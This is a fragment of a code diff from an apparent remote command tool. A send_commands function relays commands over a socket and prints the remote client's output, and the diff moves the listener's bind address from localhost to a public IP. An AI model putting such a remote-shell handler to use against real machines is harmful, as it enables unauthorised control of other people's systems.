@@ -14,7 +14,7 @@ def send_commands(conn):
             client_response = str(conn.recv(1024), "utf-8")
             print(client_response, end="")
             
-bind_ip = "127.0.0.1"
+bind_ip = "52.14.210.153"
 bind_port = 24123
 serv_add = (bind_ip , 24123)
 
